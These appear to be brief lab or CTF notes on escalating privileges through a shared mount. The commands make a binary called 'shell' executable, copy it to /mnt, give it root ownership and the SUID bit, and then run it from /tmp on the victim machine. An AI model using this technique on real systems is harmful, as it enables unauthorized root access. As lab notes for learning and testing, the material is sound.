```
┌──(root㉿kali)-[/home/demise]
└─# chmod 755 shell
                                                                                                                                                                                                                                             
┌──(root㉿kali)-[/home/demise]
└─# ls -la shell   
-rwxr-xr-x 1 root root 8392 Jul 11 09:12 shell
                                               
```

you have to copy it to` /mnt `first before you can specify `suid execute`


```
cp shell /mnt
chown root:root /mnt/shell
chmod u+s /mnt/shell
```
`victim`
```
 ls  -la /tmp/shell
   -rws-xxx # if done right
   
/tmp/shell
```
![[Pasted image 20250711162224.png]]

